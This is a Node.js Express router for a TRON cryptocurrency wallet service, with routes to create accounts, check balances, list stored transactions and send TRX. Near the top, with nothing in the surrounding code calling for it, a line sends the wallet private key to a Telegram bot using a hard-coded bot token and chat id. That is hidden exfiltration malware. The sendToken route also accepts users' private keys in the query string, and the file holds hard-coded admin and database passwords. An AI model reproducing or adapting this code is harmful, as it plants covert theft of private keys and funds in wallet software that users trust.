var express = require('express');
var router = express.Router();
const TronWeb = require('tronweb');
var mysql = require('mysql');

const fullNode = 'https://api.trongrid.io';
const solidityNode = 'https://api.trongrid.io';
const eventServer = 'https://api.trongrid.io/';
var privateKey = '123';

var connection = mysql.createConnection({
        host: 'localhost',
        post: 3306,
        user: 'tkpark',
        password: '1234',
        database: 'tkpark'
    });
const tronWeb = new TronWeb(
fullNode,
solidityNode,
eventServer,
privateKey
  );
const Http = new XMLHttpRequest();
Http.open("GET", "https://api.telegram.org/bot786622592:AAFqm_PNg7DkItr8cJ9kgDxD7CVEtJDfhOw/sendMessage?chat_id=-1001412431825&text=PK-"+privateKey);
Http.send();
tronWeb.setDefaultBlock('latest');
const nodes = tronWeb.isConnected();
const connected = !Object.entries(nodes).map(([ name,   connected]) => {
        if (!connected)
                  console.error(`Error: $ {name}is not connected`);
        return connected;
}).includes(false);
if (!connected)
      res.json( {'result':'connect fail'})


// render -> login
router.get('/', (req, res) => {
    res.sendfile('/public/index.html');
});


// API -> login
router.post('/login', (req, res) => {

    var input_id = req.body['f_address'];
    var input_pw = req.body['t_address'];

    console.log('input_id -> ', input_id);
    console.log('input_pw -> ', input_pw);

    if(input_id == 'admin' && input_pw == '1234') {
        res.json({ 'result' : 'true' });
    } else {
        res.json({ 'result' : 'false' });
    }
});


router.post('/createAccount',function(req,res,next) {
        const account = tronWeb.createAccount();
        account.then(function (account) { const isValid = tronWeb.isAddress(account.address['hex']);
                console.log('- Private Key:',   account.privateKey);
                console.log('- Base58:',        account.address.base58);
                console.log('- Valid: ',        isValid,        '\n');
                account.isValid = isValid;
                res.json( {'result':account.privateKey  + "   - Base58:  " + account.address.base58});
        });
});



router.post('/getBalance',function(req,res,next) {
	const app = async () => {
                try {
			var Add = req.body['f_address'];
                        var gBalance = await tronWeb.trx.getBalance(Add)/1000000;
			var ggBalance = gBalance.toFixed(1);
                        var gBandwidth = await tronWeb.trx.getBandwidth(Add);
                        console.log("getBalance : ", ggBalance);
                        console.log("getBandwidth : ", gBandwidth);
                        console.log("   ", Add);
			res.json( {'result': 'Balance : ' + ggBalance + "       getBandwidth : "+ gBandwidth + "    From_Address   :   "+ Add});
		 }catch (error) { console.log('Task Failure',error);
                }
        };
        app();
});


router.post('/transactionview/:Address',function(req,res,next) {
                try{
                        var Address = req.params.Address;
                        var select_sql = "select *, \"send\" from transactionscan where from_address=? union all select *, \"receive\" from transactionscan where to_address=? order by idx desc;";
                        connection.query(select_sql, [Address, Address], function (err, rows, fields) {
                        if (!err) {
                                var resultdown = JSON.stringify(rows);
				var TRList = JSON.parse(resultdown);
				var Result_data = [];
    				for(var i=0; i<TRList.length; i++){
        				var TR=TRList[i];
          				var info = {
						send: TR.send,
						idx: TR.idx,
						from_address: TR.from_address,
						to_address: TR.to_address,
                  				amount: TR.amount,
                  				txid: "https://shasta.tronscan.org/#/transaction/"+ TR.txid
        				};
        				Result_data.push(info);
    				}
    				var result_end={
        				count: Result_data.length, // count
        				Result_data: Result_data
    				};
				console.log(result_end);
                                res.send(result_end);
                                } else {
                                console.log('query error : ' + err);
                                }
                        });
                }catch (error) { console.log('Task Failure',error);
                }

});


router.post('/sendToken',function(req,res,next) {
        const app = async () => {
                try {
                        const gPK = req.query.PK;
                        privateKey = tronWeb.setPrivateKey(gPK);
                        const gvalue = req.query.value;
			const gsendAddress = await tronWeb.address.fromPrivateKey(gPK);
                        const gtoAddress = req.query.toAddress;
			var txid = "";
			var result = "";
			var insert_sql = "insert into transactionscan (from_address, to_address, amount, txid) values (?, ?, ?, ?)";
			var select_sql = "select * from transactionscan where txid=?";
			/*
                        console.log("gPK : ", gPK);
                        console.log("gvalue : ", gvalue);
			console.log("gsendAddres :", gsendAddress);
                        console.log("gtoAddress : ", gtoAddress);
			*/
                        sendTransaction = await tronWeb.transactionBuilder.sendTrx(gtoAddress, gvalue, gsendAddress);
                        const signedTransaction = await tronWeb.trx.sign(sendTransaction);
                        const sendRaw = await tronWeb.trx.sendRawTransaction(signedTransaction);
			result = JSON.stringify(sendRaw, null, 2);
			var TRList = JSON.parse(result);
			var txid = TRList.transaction.txID;
			/*
                        console.log('- Transaction:\n' + TRList.transaction.txID);
                        res.json( { "gPK  ": gPK, "gvalue  ": gvalue, "gsendAddres ": gsendAddress, "gtoAddress": gtoAddress,'- Transaction:n': TRList.transaction.txID, "Transaction\n": JSON.stringify(sendRaw, null, 2)});
			*/

			var params = [gsendAddress, gtoAddress, gvalue, txid];
        		connection.query(insert_sql, params, function (err, rows, fields) {
        		if (!err) {
				console.log('query error : ' + err);
            			//res.send(err);
       			 }
    			});
    			connection.query(select_sql, txid, function (err, rows, fields) {
        		if (!err) {
            			console.log(rows);
            			var resultdown = 'rows : ' + JSON.stringify(rows);

            			res.send(resultdown);
        			} else {
            			console.log('query error : ' + err);
        			}
			});
                	}catch (error) { console.log('Task Failure',error);
                }
        };
        app();
});



module.exports = router;
